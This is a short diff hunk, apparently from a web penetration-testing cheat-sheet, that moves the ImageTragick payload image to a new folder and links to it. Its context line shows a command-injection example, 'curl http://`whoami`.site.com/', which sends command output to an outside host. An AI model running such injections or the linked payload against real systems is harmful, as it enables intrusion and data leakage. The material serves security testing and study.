@@ -819,7 +819,7 @@ curl http://`whoami`.site.com/
   
 ### ImageTragik
 
-codes/rce/tragik.jpg
+codes/others/tragik.jpg
   
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
   
